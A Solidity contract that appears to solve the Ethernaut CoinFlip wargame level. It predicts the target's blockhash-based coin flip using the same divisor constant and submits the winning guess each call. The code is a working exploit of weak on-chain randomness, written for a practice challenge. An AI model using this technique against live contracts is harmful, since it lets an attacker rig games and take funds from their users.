// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "./levels/CoinFlip.sol";

contract CoinFlipAttack {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    uint256 public consecutiveWins;
    address private _coinFlipAddr;

    constructor(address _coinflip) public {
        _coinFlipAddr = _coinflip;
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // if (lastHash == blockValue) {
        //     revert();
        // }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // call ethernaut coinflip sc
        return CoinFlip(_coinFlipAddr).flip(side);
    }
}
